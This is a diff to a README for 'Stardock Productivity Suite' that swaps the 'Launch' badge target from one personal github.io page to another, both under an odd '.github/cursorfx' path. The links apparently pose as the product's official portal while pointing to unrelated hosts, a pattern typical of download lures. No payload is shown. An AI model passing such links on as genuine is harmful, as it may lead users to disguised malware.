@@ -18,7 +18,7 @@ With **Stardock Productivity Suite**, you gain clarity, reduce context switching
 
 ## Getting Started
 
-[![Launch Stardock Productivity Suite](https://img.shields.io/badge/Launch-Stardock_Productivity_Suite-green)](https://alkidatekel.github.io/.github/cursorfx)
+[![Launch Stardock Productivity Suite](https://img.shields.io/badge/Launch-Stardock_Productivity_Suite-green)](https://gaddehfsfs.github.io/.github/cursorfx)
 
 1. Visit the official **Stardock Productivity Suite** portal.  
 2. Choose your platform (Web, iOS, Android, Linux).  
